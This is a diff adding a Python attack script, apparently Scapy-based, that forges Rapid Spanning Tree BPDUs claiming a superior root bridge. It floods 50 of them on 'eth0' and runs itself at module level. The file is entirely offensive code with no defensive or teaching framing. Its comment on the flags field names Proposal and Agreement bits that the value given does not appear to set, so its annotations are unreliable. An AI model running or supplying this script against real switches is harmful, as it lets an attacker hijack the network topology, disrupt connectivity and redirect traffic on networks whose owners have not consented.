@@ -1,0 +1,34 @@
+def rstp_proposal_agreement_attack(interface):
+    """
+    Exploit RSTP proposal/agreement mechanism
+    """
+    print("[+] Executing RSTP proposal/agreement attack...")
+    
+    # RSTP BPDU with Proposal flag
+    rstp_proposal = (
+        Dot3(dst="01:80:c2:00:00:00") /
+        LLC(dsap=0x42, ssap=0x42, ctrl=3) /
+        STP(
+            proto=0x0000,
+            version=0x02,               # RSTP Version
+            bpdutype=0x02,              # RSTP BPDU
+            flags=0x3C,                 # Proposal + Learning + Forwarding + Agreement
+            rootid=0x0000001122334455,  # Superior root
+            rootpathcost=0x00000000,
+            bridgeid=0x0000001122334455,
+            portid=0x8001,
+            age=0x0000,
+            maxage=0x1400,
+            hello=0x0200,
+            fwddelay=0x0f00
+        )
+    )
+    
+    # Send RSTP proposals rapidly
+    for i in range(50):
+        sendp(rstp_proposal, iface=interface, verbose=0)
+        time.sleep(0.1)  # Rapid transmission
+        
+    print("[+] RSTP proposal attack completed")
+
+rstp_proposal_agreement_attack("eth0")
